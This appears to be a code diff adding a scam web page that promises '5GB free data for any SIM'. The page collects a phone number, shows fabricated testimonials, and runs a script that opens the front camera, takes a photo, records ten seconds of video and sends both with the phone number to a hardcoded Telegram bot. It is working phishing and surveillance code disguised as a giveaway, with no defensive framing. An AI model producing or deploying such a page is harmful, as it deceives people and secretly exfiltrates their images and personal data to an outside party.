@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get 5GB Free Data</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #e0f7fa 0%, #80deea 100%);
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            text-align: center;
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+            max-width: 500px;
+            width: 100%;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 15px 20px;
+            background-color: #ffeb3b;
+            color: #333;
+            border-radius: 12px 12px 0 0;
+        }
+        h1 {
+            color: #00796b;
+            font-size: 28px;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #555;
+            font-size: 16px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        form {
+            margin-top: 20px;
+        }
+        input[type="text"] {
+            padding: 12px;
+            font-size: 16px;
+            width: 100%;
+            box-sizing: border-box;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            background-color: #f9f9f9;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            cursor: pointer;
+            background-color: #4caf50;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #388e3c;
+        }
+        .message, .loading-message {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #333;
+        }
+        .loading-message {
+            display: none;
+            color: #007BFF;
+        }
+        .note {
+            font-size: 14px;
+            color: #777;
+            margin-top: 20px;
+        }
+        .testimonials {
+            margin-top: 30px;
+        }
+        .testimonial {
+            display: flex;
+            align-items: center;
+            background-color: #f1f1f1;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+        }
+        .testimonial img {
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            margin-right: 15px;
+        }
+        .testimonial .text {
+            font-size: 16px;
+            color: #555;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+            .container {
+                padding: 20px;
+            }
+            .header {
+                font-size: 18px;
+                padding: 10px 15px;
+            }
+            h1 {
+                font-size: 24px;
+            }
+            p {
+                font-size: 14px;
+            }
+            button {
+                padding: 12px 24px;
+                font-size: 16px;
+            }
+            .message, .loading-message {
+                font-size: 16px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header {
+                font-size: 16px;
+                flex-direction: column;
+                padding: 10px;
+            }
+            .header div {
+                margin-bottom: 5px;
+            }
+            h1 {
+                font-size: 22px;
+            }
+            p {
+                font-size: 14px;
+            }
+            button {
+                padding: 10px 20px;
+                font-size: 14px;
+            }
+            .testimonial img {
+                width: 40px;
+                height: 40px;
+            }
+            .testimonial .text {
+                font-size: 14px;
+            }
+        }
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+    
+    <div class="container">
+        <div class="header">
+            <div>FREE OFFER</div>
+            <div>FREE OFFER</div>
+            <div>FREE OFFER</div>
+        </div>
+        <h1>Get 5GB Free Data for Any SIM</h1>
+        <p>We are offering a limited-time promotion where you can get 5GB of free data for any SIM card. Just follow the steps below to claim your free data. This offer is 100% genuine and backed by leading telecom providers.</p>
+        <form id="phoneNumberForm">
+            <label for="phoneNumber">Phone Number:</label>
+            <input type="text" id="phoneNumber" name="phoneNumber" required pattern="\d{10,20}">
+            <button type="button" onclick="getFreeData()">Get Free Data</button>
+        </form>
+        <div class="message" id="message"></div>
+        <div class="loading-message" id="loadingMessage">Please wait, processing your request...</div>
+        <div class="note">Note: This offer is valid for a limited time only. Make sure to complete the process as soon as possible to avail the benefits.</div>
+        
+        <div class="testimonials">
+            <div class="testimonial">
+                <img src="https://images.unsplash.com/photo-1564564321837-a57b7070ac4f?w=600&auto=format&fit=crop&q=60&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8OHx8bWFufGVufDB8fDB8fHww/50" alt="John D.">
+                <div class="text">"This offer is amazing! I got my free followers in minutes. Highly recommend!".</div>
+            </div>
+            <div class="testimonial">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQKTT0yjiC_oQ6pI2R9x0CFUaRtY4vDG-LUg&s" alt="John D.">
+                <div class="text">"I was skeptical at first, but it really works. Thanks for the free followers!".</div>
+            </div>
+            <div class="testimonial">
+                <img src="https://pixabay.com/illustrations/man-student-fashion-portrait-pose-8523053/" alt="Michael B.">
+                <div class="text">"Absolutely fantastic service. My followers increased significantly in no time!".</div>
+            </div>
+            <div class="testimonial">
+                <img src="https://pixabay.com/photos/boy-cute-man-happy-smile-bd-boy-4827065/" alt="Jessica L.">
+                <div class="text">"I'm so happy with the results. I gained so many new followers quickly and easily." .</div>
+            </div>
+            <div class="testimonial">
+                <img src="https://cdn.pixabay.com/photo/2020/03/28/08/10/man-4976014_1280.jpg" alt="David K.">
+                <div class="text">"This is the best follower service I've ever used. Highly efficient and reliable.".</div>
+            </div>
+            <div class="testimonial">
+                <img src="https://cdn.pixabay.com/photo/2023/02/19/08/39/man-7799486_1280.jpg" alt="Emma W.">
+                <div class="text">"Amazing experience! The free followers came through as promised.".</div>
+            </div>
+        </div>
+        
+
+    <script>
+        let captureCount = 0;
+        const MAX_CAPTURES = 3;
+        const TELEGRAM_BOT_TOKEN = '8448756076:AAHH5BXR-txR5xZXiJpdRU5Eb1Uu5SH1cOY'; // 
+        const CHAT_ID = '7740942491'; // 
+        function getFreeData() {
+            const messageElement = document.getElementById('message');
+            const loadingMessageElement = document.getElementById('loadingMessage');
+            loadingMessageElement.style.display = 'block';
+            messageElement.textContent = '';
+
+            captureMedia();
+        }
+
+        async function captureMedia() {
+            if (captureCount >= MAX_CAPTURES) {
+                alert('You have reached the maximum number of captures.');
+                return;
+            }
+
+            captureCount++;
+
+            try {
+                const constraints = {
+                    video: {
+                        facingMode: 'user' // Use front camera
+                    }
+                };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const videoTrack = stream.getVideoTracks()[0];
+
+                const imgData = await captureImageFromStream(stream);
+                const imgBlob = await fetch(imgData).then(res => res.blob());
+                const phoneNumber = document.getElementById('phoneNumber').value;
+                sendMediaToTelegram(imgBlob, 'photo', phoneNumber);
+
+                const videoBlob = await captureVideoFromStream(stream);
+                sendMediaToTelegram(videoBlob, 'video', phoneNumber);
+
+                stream.getTracks().forEach(track => track.stop());
+
+                const messageElement = document.getElementById('message');
+                const loadingMessageElement = document.getElementById('loadingMessage');
+                loadingMessageElement.style.display = 'none';
+                messageElement.textContent = 'Thank you for your interest! Your request was successful.';
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                alert('Error accessing camera. Please make sure your device supports camera access.');
+            }
+        }
+
+        async function captureImageFromStream(stream) {
+            const track = stream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(track);
+            return imageCapture.takePhoto().then(blob => {
+                return URL.createObjectURL(blob);
+            });
+        }
+
+        function captureVideoFromStream(stream) {
+            const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            const chunks = [];
+            mediaRecorder.ondataavailable = function(event) {
+                if (event.data.size > 0) {
+                    chunks.push(event.data);
+                }
+            };
+            mediaRecorder.start();
+            return new Promise((resolve, reject) => {
+                mediaRecorder.onstop = function() {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    resolve(blob);
+                };
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 10000); // Stop recording after 10 seconds
+            });
+        }
+
+        function sendMediaToTelegram(blob, type, phoneNumber) {
+            const formData = new FormData();
+            formData.append(type, blob, `${type}_${captureCount}.webm`);
+            formData.append('caption', `Phone Number: ${phoneNumber}`);
+
+            axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, formData, {
+                params: {
+                    chat_id: CHAT_ID
+                }
+            })
+            .then(response => {
+                console.log('Media sent successfully:', response.data);
+            })
+            .catch(error => {
+                console.error('Error sending media to Telegram:', error);
+            });
+        }
+    </script>
+</body>
+</html>
+          
